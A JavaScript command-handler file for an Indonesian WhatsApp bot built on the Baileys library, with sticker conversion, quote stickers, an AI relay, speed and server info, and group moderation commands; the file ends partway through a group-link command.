import {
    BufferJSON,
    fetchLatestBaileysVersion,
    WA_DEFAULT_EPHEMERAL,
    generateWAMessageFromContent,
    proto,
    delay,
    generateWAMessageContent,
    generateWAMessage,
    prepareWAMessageMedia,
    areJidsSameUser,
    getDevice,
    getContentType,
    downloadContentFromMessage
} from "@whiskeysockets/baileys";

import { color, bgcolor } from "../lib/color.js";
import fs from "fs";
import ms from "parse-ms";
import axios from 'axios';
import * as cheerio from "cheerio";
import crypto from 'crypto';
import toMs from "ms";
import { Jimp } from "jimp";
import os from 'os';
import path from 'path';
import { fileURLToPath } from 'url';
import logg from 'pino';
import moment from "moment-timezone";
import util from "util";
import yts from "yt-search";
import * as mathjs from 'mathjs';
import { inspect } from 'util';
import { getLinkPreview, getPreviewFromContent } from "link-preview-js";
import { pathToFileURL } from 'url';
import fetch from 'node-fetch';
import { exec, spawn } from "child_process";
import imgbbUploader from "imgbb-uploader";
import chalk from 'chalk';
import cp from 'child_process';
import speed from 'performance-now';
import { promisify } from 'util';
import setting from '../lib/settings.json' with { type: 'json' };
import mess from '../lib/response.json' with { type: 'json' };
const { ownerNumber, prefix: defaultPrefix } = setting;
//// IMPORT LIB
import { ndown, instagram, tikdown, ytdown, threads, twitterdown, fbdown2, GDLink, pintarest, capcut, likee, alldown, alldownV2, spotifySearch, soundcloudSearch, spotifyDl, soundcloud,terabox } from "../lib/downloader.js"
import { wxGpt, SpotifyDL, igStalk } from "../lib/azmi-api.js"
import { allsurah, getSurah, quranAudio, randomDoa, surah } from "../lib/alquran.js"
import { webp2mp4File } from "../lib/convert.js"
import { Button, AIRich } from "../lib/button.js"
import { 
    serialize, getBuffer, fetchJson, fetchText, getRandom, pickRandom,
    getGroupAdmins, getGroupAdminsid, runtime, runtime2, sleep, generateProfilePicture,
    makeid, makeid2, removeEmojis, calculate_age, bytesToSize, checkBandwidth 
} from "../lib/myfunc.js";

import { 
    smsg, formatp, tanggal, formatDate, getTime, isUrl, 
    clockString, jsonformat, parseMention, parseMention2, reSize 
} from "../lib/otherfunc.js";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

moment.tz.setDefault("Asia/Jakarta").locale("id");

export default async (store, karr, msg, m) => {
    try {
        const { type, quotedMsg, mentioned, now, fromMe, isBaileys } = msg;
        let isQuotedMsg;
        if (msg.quotedMsg !== null && msg.quotedMsg !== undefined) {
           isQuotedMsg = true;
         } else {
            isQuotedMsg = false;
        }
        const toJSON = (j) => JSON.stringify(j, null, "\t");
                const from = msg.key.remoteJid;
        var chats = (type === 'senderKeyDistributionMessage') ? msg.message.conversation : (type === 'conversation' && msg.message.conversation) ? msg.message.conversation : (type === 'imageMessage') && msg.message.imageMessage.caption ? msg.message.imageMessage.caption : (type === 'videoMessage') && msg.message.videoMessage.caption ? msg.message.videoMessage.caption : (type === 'extendedTextMessage') && msg.message.extendedTextMessage.text ? msg.message.extendedTextMessage.text : (type === 'buttonsResponseMessage') && quotedMsg.fromMe && msg.message.buttonsResponseMessage.selectedButtonId ? msg.message.buttonsResponseMessage.selectedButtonId : (type === 'templateButtonReplyMessage') && quotedMsg.fromMe && msg.message.templateButtonReplyMessage.selectedId ? msg.message.templateButtonReplyMessage.selectedId : (type === 'messageContextInfo') ? (msg.message.buttonsResponseMessage?.selectedButtonId || msg.message.listResponseMessage?.singleSelectReply.selectedRowId) : (type == 'listResponseMessage') && quotedMsg.fromMe && msg.message.listResponseMessage.singleSelectReply.selectedRowId ? msg.message.listResponseMessage.singleSelectReply.selectedRowId : ""
          if (chats == undefined) { chats = '' }
        const args = chats.split(" ");
        const botNumber = karr.user.id.split(":")[0] + "@s.whatsapp.net";
        const command = chats.toLowerCase().split(" ")[0] || "";
        const isGroup = msg.key.remoteJid.endsWith("@g.us");
        const sender = isGroup ? msg.key.participantAlt ? msg.key.participantAlt : msg.participantAlt : msg.key.remoteJidAlt;
        const isOwner = ownerNumber == sender ? true : ["6285811597011@s.whatsapp.net"].includes(sender) ? true : false;
        const pushname = msg.pushName || "No Name"
        const groupMetadata = isGroup ? await karr.groupMetadata(from) : ''
        const groupName = isGroup ? groupMetadata.subject : ''
        const groupOwner = isGroup ? groupMetadata.subjectOwner : ''
        const groupId = isGroup ? groupMetadata.id : ''
        const groupMembers = isGroup ? groupMetadata.participants : ''
        const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
        const isBotGroupAdmins = groupAdmins.includes(botNumber) || false
        const isGroupAdmins = groupAdmins.includes(sender)
        let prefix;
        if (karr.multi) {
            prefix = /^[°•π÷×¶∆£•²¢€¥®™✓_=|~!?#%^&.+-,\/\\©^]/.test(chats) ? chats.match(/^[°•π÷×¶∆£•²¢€¥®™✓_=|~!?#%^&.+-,\/\\©^]/gi)[0] : '#'
        } else {
            prefix = karr.nopref ? '' : defaultPrefix;
        }
        const body = chats.startsWith(prefix) ? chats : ''
        const q = chats.slice(command.length + 1, chats.length);
        const text = args.join(' ')
        const budy = chats.toLowerCase()
        const isCmd = chats.startsWith(prefix)
        const jam = moment.tz('asia/jakarta').format('HH:mm:ss')
        let dt = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
        const ucapanWaktu = "Selamat " + dt.charAt(0).toUpperCase() + dt.slice(1)
        const content = JSON.stringify(msg.message)
////FUNTION TANGGAL 
           var buln = ['/01/', '/02/', '/03/', '/04/', '/05/', '/06/', '/07/', '/08/', '/09/', '/10/', '/11/', '/12/'];
           var buln2 = ['01', '02', '03', '04', '05', '06', '07', '08', '09', '10', '11', '12'];
           var myHari = ['Minggu', 'Senin', 'Selasa', 'Rabu', 'Kamis', 'Jumat', 'Sabtu'];
           var tgel = new Date();
           var hri = tgel.getDate();
           var bulnh = tgel.getMonth();
           var thisHari = tgel.getDay(),
            thisDaye = myHari[thisHari];
           var yye = tgel.getYear();
           var syear = (yye < 1000) ? yye + 1900 : yye;
           const jangwak = (hri + '' + buln[bulnh] + '' + syear)
           const jangwak2 = (syear + '' + buln[bulnh] + '' + hri)
           const janghar = (thisDaye)
        if (fromMe) return

        // --- Utility Functions ---
        const reply = (teks) => {
            return karr.sendMessage(from, { text: teks, mentions: parseMention(teks) }, { quoted: msg, messageId: 'KARUTA_' + makeid(9).toUpperCase() })
        };

        if (msg && !fromMe) {
            console.log('->[\x1b[1;32mPESAN\x1b[1;37m]', color(moment(msg.messageTimestamp * 1000).format('DD/MM/YYYY HH:mm:ss'), 'yellow'), color(`${chats} [${args.length}]`), 'from', color(pushname), 'in', color(groupName || 'Private Chat'))
        }

        const isImage = (type == 'imageMessage')
        const isVideo = (type == 'videoMessage')
        const isSticker = (type == 'stickerMessage')
        const isViewOnce = (type == 'viewOnceMessageV2')
        const isAudio = (type == 'audioMessage')
        const isQuotedImage = isQuotedMsg ? (quotedMsg.type === 'imageMessage') ? true : false : false
        const isQuotedAudio = isQuotedMsg ? (quotedMsg.type === 'audioMessage') ? true : false : false
        const isQuotedDocument = isQuotedMsg ? (quotedMsg.type === 'documentMessage') ? true : false : false
        const isQuotedVideo = isQuotedMsg ? (quotedMsg.type === 'videoMessage') ? true : false : false
        const isQuotedSticker = isQuotedMsg ? (quotedMsg.type === 'stickerMessage') ? true : false : false
        const isQuotedViewOnce = isQuotedMsg ? (quotedMsg.type === 'viewOnceMessageV2') ? true : false : false
        const mentionByTag = type == "extendedTextMessage" && msg.message.extendedTextMessage.contextInfo != null ? msg.message.extendedTextMessage.contextInfo.mentionedJid : []
        const mentionByReply = type == "extendedTextMessage" && msg.message.extendedTextMessage.contextInfo != null ? msg.message.extendedTextMessage.contextInfo.participant || "" : ""
        const mention = typeof(mentionByTag) == 'string' ? [mentionByTag] : mentionByTag
        mention != undefined ? mention.push(mentionByReply) : []
        const mentionUser = mention != undefined ? mention.filter(n => n) : []
const wait = () => {
karr.sendMessage(from, { react: { text: `⌛`, key: msg.key }})
}
async function groupSatus(jid, content) {
  const inside = await generateWAMessageContent(content, {
    upload: karr.waUploadToServer
  });
  const messageSecret = crypto.randomBytes(32);
  const mig = generateWAMessageFromContent(jid, {
    messageContextInfo: {
      messageSecret 
    },
    groupStatusMessageV2: {
      message: {
        ...inside,
        messageContextInfo: {
          messageSecret
        }
      }
    }
  }, {});
  await karr.relayMessage(jid, mig.message, {
    messageId: mig.key.id
  });
  return mig;
}
               function mentions(teks, mems = [], id) {
               if (id == null || id == undefined || id == false) {
               let res = karr.sendMessage(from, { text: teks, mentions: mems })
               return res
               } else {
               let res = karr.sendMessage(from, { text: teks, mentions: mems }, { quoted: msg })
               return res
               }
               }
        switch (command) {
//// TARO CASE FITUR NYA DISINI ///
//// MAIN COMMAND
case prefix+'menu':{
const inimenu = await import('./menu.js');
inimenu.default(ucapanWaktu, janghar, jangwak, pushname, karr, from, prefix, msg);
}
break
case prefix+'ping':{
var timestamp = speed();
var latensi = speed() - timestamp
reply(`*Pong!!*\nSpeed: ${latensi.toFixed(4)}s`)
}
break
case prefix+'speedtest': {
let exec = promisify(cp.exec).bind(cp)
let o
reply('Testing speed..')
try {
o = await exec('speedtest --share')
} catch (e) {
o = e
} finally {
let { stdout, stderr } = o
let link = stdout.match(/https?:\/\/www\.speedtest\.net\/result\/\d+\.png/)[0]
if (stdout.trim()) reply(stdout)
if (stderr.trim()) reply(stderr)
}
}
break
case prefix+'sc': case prefix+'script':{
let capt = `
*CATATAN PENGGUNAAN !!*
- Edit nomor owner di lib/setting.json
- Edit custom kode di lib/setting.json
- Pastikan versi NodeJS V20+
- Script ini 100% GRATIS

*TENTANH BOT INI*
- ✔️ | *Simple*
- ✔️ | *Multi Device* 
- ✔️ | *ESM  Code*
- ✔️ | *Case*
- ✔️ | *Baileys original Latest*
- ✔️ | *Thumbnail Message*
`
const btn = new Button()
.setTitle('*ASHEMA ESM V1*')
.setBody(capt)
.setFooter("© Ashema Karuta")

.addUrl(
  "Ashema Script",
  "https://github.com/Karuta33/base-esm"
)
await btn.run(
  from,
  karr,
  msg
)
}
break
case prefix+'cpu': case prefix+'server': case prefix+'speed':{
let timestamp = speed();
let latensi = speed() - timestamp;
exec(`neofetch --stdout`, (error, stdout, stderr, json) => {
 let child = stdout.toString("utf-8");
 let ssd =
 child.replace(/Memory:/, "Ram:");
 reply(`• *CPU:* ${ssd}*Kecepatan* : ${latensi.toFixed(4)} _ms_\n• *Memory:* ${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(os.totalmem / 1024 / 1024)}MB\n• *OS:* ${os.version()}\n• *Platform:* ${os.platform()}\n• *Hostname:* ${os.hostname()}`);
   });
}
break
case prefix+'ai':{
if (!q) return reply('Masukan promt nya!')
karr.sendPresenceUpdate('composing', from)
try {
let ai = await wxGpt(q)
let capt = ai.data.result.replace('欢迎使用 公益站! 站长合作邮箱：wxgpt@qq.com<br/>', ' ')
reply(capt)
} catch (err) {
reply(`Request pending tunggu beberapa saat lagi..`)
}
}
break
///// CONVERTER MENU
case prefix+'sticker': case prefix+'stiker': case prefix+'s':{
var pname = setting.packname
var athor = setting.author
if (isImage || isQuotedImage) {
  wait()
var media = await karr.downloadAndSaveMediaMessage(msg, 'image', `./tmp/${sender}.jpeg`)
var opt = { packname: pname, author: athor }
karr.sendImageAsSticker(from, media, msg, opt)
.then( res => {
fs.unlinkSync(media)
}).catch((e) => reply('Error'))
} else if (isVideo || isQuotedVideo) {
  wait()
var media = await karr.downloadAndSaveMediaMessage(msg, 'video', `./tmp/${sender}.jpeg`)
var opt = { packname: pname, author: athor }
karr.sendImageAsSticker(from, media, msg, opt)
.then( res => {
  fs.unlinkSync(media)
}).catch((e) => reply('Error'))
} else if (isQuotedSticker) {
 wait()
var media = quotedMsg['stickerMessage'].isAnimated !== true ? await karr.downloadAndSaveMediaMessage(msg, 'sticker', `./tmp/${sender}.jpeg`) : await karr.downloadAndSaveMediaMessage(msg, 'sticker', `./tmp/${sender}.webp`)
media = quotedMsg['stickerMessage'].isAnimated !== true ? media : (await webp2mp4File(media)).data
var opt = { packname: pname, author: athor }
quotedMsg['stickerMessage'].isAnimated !== true ?
 karr.sendImageAsSticker(from, media, msg, opt)
  .then( res => { fs.unlinkSync(media) }).catch((e) => reply('Error'))
  : karr.sendVideoAsSticker(from, media, msg, opt)
.then( res => { fs.unlinkSync(`./tmp/${sender}.webp`) }).catch((e) => reply('Error'))
} else {
reply(`Kirim gambar/vidio dengan caption ${command} atau balas gambar/vidio yang sudah dikirim\nNote : Maximal vidio 10 detik!`)
}
}
break
case prefix+'toimg': case prefix+'toimage': case prefix+'tovid': case prefix+'tovideo':{
if (!isQuotedSticker) return reply(`Reply stikernya!`)
var stream = await downloadContentFromMessage(msg.message.extendedTextMessage?.contextInfo.quotedMessage.stickerMessage, 'sticker')
var buffer = Buffer.from([])
for await(const chunk of stream) {
buffer = Buffer.concat([buffer, chunk])
}
var rand1 = 'tmp/'+getRandom('.webp')
var rand2 = 'tmp/'+getRandom('.png')
fs.writeFileSync(`./${rand1}`, buffer)
if (isQuotedSticker && msg.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.isAnimated !== true) {
exec(`ffmpeg -i ./${rand1} ./${rand2}`, (err) => {
  fs.unlinkSync(`./${rand1}`)
  if (err) return reply("Error")
  karr.sendMessage(from, { image: fs.readFileSync(`./${rand2}`) }, { quoted: msg })
  fs.unlinkSync(`./${rand2}`)
})
} else {
webp2mp4File(`./${rand1}`).then(async(data) => {
  fs.unlinkSync(`./${rand1}`)
  karr.sendMessage(from, { video: await getBuffer(data.data) }, { quoted: msg })
})
}
}
break
case prefix+'swm': case prefix+'wm':{
var pname = q.split('|')[0] ? q.split('|')[0] : q
var athor = q.split('|')[1] ? q.split('|')[1] : ''
if (isImage || isQuotedImage) {
if (args.length < 2) return reply(`Penggunaan ${command} nama|author`)
var media = await karr.downloadAndSaveMediaMessage(msg, 'image', `./tmp/${sender}.jpeg`)
var opt = { packname: pname, author: athor }
karr.sendImageAsSticker(from, media, msg, opt)
.then( res => {
fs.unlinkSync(media)
}).catch((e) => reply(mess.error.api))
} else if (isVideo || isQuotedVideo) {
if (args.length < 2) return reply(`Penggunaan ${command} nama|author`)
wait()
var media = await karr.downloadAndSaveMediaMessage(msg, 'video', `./tmp/${sender}.jpeg`)
var opt = { packname: pname, author: athor }
karr.sendImageAsSticker(from, media, msg, opt)
.then( res => {
  fs.unlinkSync(media)
}).catch((e) => reply(mess.error.api))
} else if (isQuotedSticker) {
if (args.length < 2) return reply(`Penggunaan ${command} nama|author`)
wait()
var media = quotedMsg['stickerMessage'].isAnimated !== true ? await karr.downloadAndSaveMediaMessage(msg, 'sticker', `./tmp/${sender}.jpeg`) : await karr.downloadAndSaveMediaMessage(msg, 'sticker', `./tmp/${sender}.webp`)
media = quotedMsg['stickerMessage'].isAnimated !== true ? media : (await webp2mp4File(media)).data
var opt = { packname: pname, author: athor }
quotedMsg['stickerMessage'].isAnimated !== true ?
 karr.sendImageAsSticker(from, media, msg, opt)
  .then( res => { fs.unlinkSync(media) }).catch((e) => reply(mess.error.api))
  : karr.sendVideoAsSticker(from, media, msg, opt)
.then( res => { fs.unlinkSync(`./tmp/${sender}.webp`) }).catch((e) => reply(mess.error.api))
} else {
reply(`Kirim/Balas gambar/video/sticker dengan caption ${prefix}stickerwm nama|author atau tag gambar/video yang sudah dikirim\nNote : Durasi video maximal 10 detik`)
}
}
break
case prefix+'smeme': case prefix+'stikermeme': case prefix+'stickermeme': case prefix+'memestiker':{
if (!q) return reply(`Masukan text contoh *#smeme Halo* Untuk satu text dan untuk membuat text atas dan bawah kalian bisa menggunakan *#smeme Hallo | Aku disini*`)
var opt = { packname: setting.packname, author: setting.author }
if (isImage || isQuotedImage) {
try {
if (!q) return reply(`Masukan text contoh *#smeme Halo* Untuk satu text dan untuk membuat text atas dan bawah kalian bisa menggunakan *#smeme Hallo | Aku disini*`)
wait()
var media = await karr.downloadAndSaveMediaMessage(msg, 'image', `./tmp/${sender+Date.now()}.jpg`)
imgbbUploader(`${setting.imgbbkey}`, media)
.then(async (data) => {
var urls = data.display_url
if (q.includes('|')){
var atas = q.includes('|') ? q.split('|')[0] ? q.split('|')[0] : q : '-'
var bawah = q.includes('|') ? q.split('|')[1] ? q.split('|')[1] : '' : q
var meme_url = `https://api.memegen.link/images/custom/${encodeURIComponent(atas)}/${encodeURIComponent(bawah)}.png?background=${urls}`
} else {
var meme_url = `https://api.memegen.link/images/custom/ /${encodeURIComponent(q)}.png?background=${urls}`
}
karr.sendImageAsSticker(from, meme_url, msg, opt)
fs.unlinkSync(media)
})
} catch (e) {
reply(mess.error.api)
 }
} else if (isQuotedSticker) {
try {
if (args.length < 1) return reply(`Kirim perintah ${command} teks`)
wait()
var media = await karr.downloadAndSaveMediaMessage(msg, 'sticker', `./tmp/${sender+Date.now()}.webp`)
imgbbUploader(`${setting.imgbbkey}`, media)
.then(async (data) => {
var urls = data.display_url
if (q.includes('|')){
var atas = q.includes('|') ? q.split('|')[0] ? q.split('|')[0] : q : '-'
var bawah = q.includes('|') ? q.split('|')[1] ? q.split('|')[1] : '' : q
var meme_url = `https://api.memegen.link/images/custom/${encodeURIComponent(atas)}/${encodeURIComponent(bawah)}.png?background=${urls}`
} else {
var meme_url = `https://api.memegen.link/images/custom/ /${encodeURIComponent(q)}.png?background=${urls}`
}
karr.sendImageAsSticker(from, meme_url, msg, opt)
fs.unlinkSync(media)
})
} catch (e) {
reply(mess.error.api)
 }
} else {
reply(`Kirim Gambar atau balas Sticker dengan caption ${command} teks`)
}
}
break
case prefix+'qc':{
wait()
if (q){
if (q.includes('-d')) {
if (isQuotedImage) {
var media = await karr.downloadAndSaveMediaMessage(msg, 'image', `./tmp/${sender+Date.now()}.jpg`)
let data = await imgbbUploader(`${setting.imgbbkey}`, media)
try {
var linkppuserp = await karr.profilePictureUrl(mentionUser[0], 'image')
} catch {
var linkppuserp = 'https://telegra.ph/file/e323980848471ce8e2150.png'
}
const getname = await karr.getName(mentionUser[0])
const json = {
  "type": "quote",
  "format": "png",
  "backgroundColor": "#1b1429",
  "width": 512,
  "height": 768,
  "scale": 2,
  "messages": [
    {
      "entities": [],
      "media": {
        "url": data.display_url
      },
      "avatar": true,
      "from": {
        "id": 1,
        "name": getname,
        "photo": {
          "url": linkppuserp
        }
      },
      "text": quotedMsg.chats,
      "replyMessage": {}
    }
  ]
}
const response = axios.post('https://bot.lyo.su/quote/generate', json, {
headers: {'Content-Type': 'application/json'}
//https://bot.lyo.su/quote/generate
}).then(res => {
const buffer = Buffer.from(res.data.result.image, 'base64')
var opt = { packname: setting.packname, author: setting.author }
karr.sendImageAsSticker(from, buffer, msg, opt)
});
fs.unlinkSync(media)
} else if (isQuotedMsg){
try {
var linkppuserp = await karr.profilePictureUrl(mentionUser[0], 'image')
} catch {
var linkppuserp = 'https://telegra.ph/file/e323980848471ce8e2150.png'
}
const getname = await karr.getName(mentionUser[0])
const json = {
  "type": "quote",
  "format": "png",
  "backgroundColor": "#1b1429",
  "width": 512,
  "height": 768,
  "scale": 2,
  "messages": [
    {
      "entities": [],
      "avatar": true,
      "from": {
        "id": 1,
        "name": getname,
        "photo": {
          "url": linkppuserp
        }
      },
      "text": quotedMsg.chats,
      "replyMessage": {}
    }
  ]
};
const response = axios.post('https://bot.lyo.su/quote/generate', json, {
headers: {'Content-Type': 'application/json'}
}).then(res => {
    const buffer = Buffer.from(res.data.result.image, 'base64')
var opt = { packname: setting.packname, author: setting.author }
karr.sendImageAsSticker(from, buffer, msg, opt)
});
} else if(q){
try {
var linkppuserp = await karr.profilePictureUrl(sender, 'image')
} catch {
var linkppuserp = 'https://telegra.ph/file/e323980848471ce8e2150.png'
}
const json = {
  "type": "quote",
  "format": "png",
  "backgroundColor": "#1b1429",
  "width": 512,
  "height": 768,
  "scale": 2,
  "messages": [
    {
      "entities": [],
      "avatar": true,
      "from": {
        "id": 1,
        "name": pushname,
        "photo": {
          "url": linkppuserp
        }
      },
      "text": q.replace('-d', ''),
      "replyMessage": {}
    }
  ]
};
const response = axios.post('https://bot.lyo.su/quote/generate', json, {
headers: {'Content-Type': 'application/json'}
}).then(res => {
    const buffer = Buffer.from(res.data.result.image, 'base64')
var opt = { packname: setting.packname, author: setting.author }
karr.sendImageAsSticker(from, buffer, msg, opt)
});
}
} else {
try {
var linkppuserp = await karr.profilePictureUrl(sender, 'image')
} catch {
var linkppuserp = 'https://telegra.ph/file/e323980848471ce8e2150.png'
}
const json = {
  "type": "quote",
  "format": "png",
  "backgroundColor": "#FFFFFF",
  "width": 512,
  "height": 768,
  "scale": 2,
  "messages": [
    {
      "entities": [],
      "avatar": true,
      "from": {
        "id": 1,
        "name": pushname,
        "photo": {
          "url": linkppuserp
        }
      },
      "text": q,
      "replyMessage": {}
    }
  ]
};
const response = axios.post('https://bot.lyo.su/quote/generate', json, {
headers: {'Content-Type': 'application/json'}
}).then(res => {
    const buffer = Buffer.from(res.data.result.image, 'base64')
var opt = { packname: setting.packname, author: setting.author }
karr.sendImageAsSticker(from, buffer, msg, opt)
});
}
} else if (isQuotedImage) {
var media = await karr.downloadAndSaveMediaMessage(msg, 'image', `./tmp/${sender+Date.now()}.jpg`)
data = await imgbbUploader(`${setting.imgbbkey}`, media)
try {
var linkppuserp = await karr.profilePictureUrl(mentionUser[0], 'image')
} catch {
var linkppuserp = 'https://telegra.ph/file/e323980848471ce8e2150.png'
}
const getname = await karr.getName(mentionUser[0])
const json = {
  "type": "quote",
  "format": "png",
  "backgroundColor": "#FFFFFF",
  "width": 512,
  "height": 768,
  "scale": 2,
  "messages": [
    {
      "entities": [],
      "media": {
        "url": data.display_url
      },
      "avatar": true,
      "from": {
        "id": 1,
        "name": getname,
        "photo": {
          "url": linkppuserp
        }
      },
      "text": quotedMsg.chats,
      "replyMessage": {}
    }
  ]
}
const response = axios.post('https://bot.lyo.su/quote/generate', json, {
headers: {'Content-Type': 'application/json'}
}).then(res => {
const buffer = Buffer.from(res.data.result.image, 'base64')
var opt = { packname: setting.packname, author: setting.author }
karr.sendImageAsSticker(from, buffer, msg, opt)
});
fs.unlinkSync(media)
} else if (isQuotedMsg){
try {
var linkppuserp = await karr.profilePictureUrl(mentionUser[0], 'image')
} catch {
var linkppuserp = 'https://telegra.ph/file/e323980848471ce8e2150.png'
}
const getname = await karr.getName(mentionUser[0])
const json = {
  "type": "quote",
  "format": "png",
  "backgroundColor": "#FFFFFF",
  "width": 512,
  "height": 768,
  "scale": 2,
  "messages": [
    {
      "entities": [],
      "avatar": true,
      "from": {
        "id": 1,
        "name": getname,
        "photo": {
          "url": linkppuserp
        }
      },
      "text": quotedMsg.chats,
      "replyMessage": {}
    }
  ]
};
const response = axios.post('https://bot.lyo.su/quote/generate', json, {
headers: {'Content-Type': 'application/json'}
}).then(res => {
    const buffer = Buffer.from(res.data.result.image, 'base64')
var opt = { packname: setting.packname, author: setting.author }
karr.sendImageAsSticker(from, buffer, msg, opt)
});
} else {
reply(`Kirim perintah ${command} teks
Atau reply chat ketik ${command}
gunakan -d untuk mode dark contoh :
${command} Halo -d
reply ${command} -d
`)
}
}
break
//// GROUP COMMAND
case prefix+'tagall':{
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
let teks = `*TAG ALL MEMBER*\nPesan : ${q ? q : 'kosong'}\n\n`
for (let mem of groupMembers) {
teks += `⭔ @${mem.id.split('@')[0]}\n`
}
karr.sendMessage(from, { text: teks, mentions: groupMembers.map(a => a.id) }, { quoted: msg })
}
break
case prefix+'accall': {
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
if (!isBotGroupAdmins) return reply(mess.BotAdmin)
try {
let groupMetadata = await karr.groupMetadata(from)
let pendingRequests = await karr.groupRequestParticipantsList(from)
if (!pendingRequests || pendingRequests.length === 0)
return reply("❗Tidak ada permintaan bergabung yang perlu disetujui!")
for (let user of pendingRequests) {
await karr.groupRequestParticipantsUpdate(from, [user.jid], "approve")
}
reply(`✅ Berhasil menerima semua *${pendingRequests.length}* permintaan bergabung di grup *${groupMetadata.subject}*!`)
} catch (e) {
console.log(e)
reply("❌ Terjadi kesalahan saat memproses permintaan!")
}
}
break
case prefix+'rejectall': {
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
if (!isBotGroupAdmins) return reply(mess.BotAdmin)
try {
let groupMetadata = await karr.groupMetadata(from)
let pendingRequests = await karr.groupRequestParticipantsList(from)

if (!pendingRequests || pendingRequests.length === 0)
return reply("❗ Tidak ada permintaan bergabung yang perlu ditolak!")

for (let user of pendingRequests) {
await karr.groupRequestParticipantsUpdate(from, [user.jid], "reject")
}

reply(`🚫 Semua *${pendingRequests.length}* permintaan bergabung di grup *${groupMetadata.subject}* telah ditolak.`)
} catch (e) {
console.log(e)
reply("❌ Terjadi kesalahan saat memproses penolakan!")
}
}
break
case prefix+'delete': case prefix+'del': case prefix+'d':{
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
if (!isQuotedMsg) return reply(`Balas chat yang ingin dihapus`)
if (quotedMsg.fromMe) {
karr.sendMessage(from, { delete: { fromMe: true, id: quotedMsg.id, remoteJid: from }})
} else if (!quotedMsg.fromMe) {
karr.sendMessage(from, { delete: { remoteJid: from, fromMe: false, id: quotedMsg.id, participant: mentionUser[0] }})
}
}
break
case prefix+'listadmin':{
if (!isGroup) return reply(mess.OnlyGrup)
let no = 1
let teks = '*LIST ADMIN*'
for (let i of getGroupAdminsid(groupMembers)) {
let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : i
yeh = Object.keys(store.presences[from])
isOnline = yeh.includes(i)
 	teks += `\n${no++} @${i.split("@")[0]}\n`
 	teks += ` Status : ${isOnline ? 'Online✅' : 'Offline🚫'}`
}
reply2(teks)
}
break
case prefix+'dor': case prefix+'kick':{
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
if (!isBotGroupAdmins) return reply(mess.BotAdmin)
if (mentionUser.length !== 0) {
karr.groupParticipantsUpdate(from, [mentionUser[0]], "remove")
.then( res => { mentions(`Sukses mengeluarkan @${mentionUser[0].split("@")[0]}`, [mentionUser[0]], true) })
.catch(() => reply(mess.error.api))
} else if (isQuotedMsg) {
karr.groupParticipantsUpdate(from, [quotedMsg.sender], "remove")
.then( res => { mentions(`Sukses mengeluarkan @${quotedMsg.sender.split("@")[0]}`, [quotedMsg.sender], true) })
.catch(() => reply(mess.error.api))
} else {
reply(`Tag atau balas pesan member yang ingin di kick`)
}
}
break
case prefix+'promote': case prefix+'pm':{
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
if (!isBotGroupAdmins) return reply(mess.BotAdmin)
if (mentionUser.length !== 0) {
karr.groupParticipantsUpdate(from, [mentionUser[0]], "promote")
.then( res => { mentions(`Sukses menjadikan @${mentionUser[0].split("@")[0]} sebagai admin`, [mentionUser[0]], true) })
.catch(() => reply(mess.error.api))
} else if (isQuotedMsg) {
karr.groupParticipantsUpdate(from, [quotedMsg.sender], "promote")
.then( res => { mentions(`Sukses menjadikan @${quotedMsg.sender.split("@")[0]} sebagai admin`, [quotedMsg.sender], true) })
.catch(() => reply(mess.error.api))
} else {
reply(`Tag atau balas pesan member yang ingin dijadikan admin`)
}
}
break
case prefix+'demote':{
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
if (!isBotGroupAdmins) return reply(mess.BotAdmin)
if (mentionUser.length !== 0) {
karr.groupParticipantsUpdate(from, [mentionUser[0]], "demote")
.then( res => { mentions(`Sukses menjadikan @${mentionUser[0].split("@")[0]} sebagai member biasa`, [mentionUser[0]], true) })
.catch(() => reply(mess.error.api))
} else if (isQuotedMsg) {
karr.groupParticipantsUpdate(from, [quotedMsg.sender], "demote")
.then( res => { mentions(`Sukses menjadikan @${quotedMsg.sender.split("@")[0]} sebagai member biasa`, [quotedMsg.sender], true) })
.catch(() => reply(mess.error.api))
} else {
reply(`Tag atau balas pesan admin yang ingin dijadikan member biasa`)
}
}
break
case prefix+'swgc':{
if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
if (!isGroup) return reply(mess.OnlyGrup)
if (!isBotGroupAdmins) return reply(mess.BotAdmin)
if (isImage || isQuotedImage) {
var mediar = await karr.downloadAndSaveMediaMessage(msg, 'image', `./tmp/${sender}.jpeg`)
if (isQuotedMsg) {
let options = { image: fs.readFileSync(`./tmp/${sender}.jpeg`), caption: quotedMsg.chats ? quotedMsg.chats : '' };
await groupSatus(from, options);
reply('Status terkirim')
} else {
let options = { image: fs.readFileSync(`./tmp/${sender}.jpeg`), caption: q ? q : '' };
await groupSatus(from, options);
reply('Status terkirim')
}
fs.unlinkSync(mediar)
} else if (isVideo || isQuotedVideo) {
var mediar = await karr.downloadAndSaveMediaMessage(msg, 'video', `./tmp/${sender}.mp4`)
if (isQuotedMsg) {
let options = { video: fs.readFileSync(`./tmp/${sender}.mp4`), caption: quotedMsg.chats ? quotedMsg.chats : '' };
await groupSatus(from, options);
reply('Status terkirim')
} else {
let options = { video: fs.readFileSync(`./tmp/${sender}.mp4`), caption: q ? q : '' };
await groupSatus(from, options);
reply('Status terkirim')
}
fs.unlinkSync(mediar)
} else {
reply(`Kirim gambar/vidio dengan caption ${command} atau balas gambar/vidio yang sudah dikirim`)
}
}
break
case prefix+'linkgrup': case prefix+'link': case prefix+'linkgc': case prefix+'linkgroup':{
if (!isGroup) return reply(mess.OnlyGrup)
if (!isBotGroupAdmins) return reply(mess.BotAdmin)
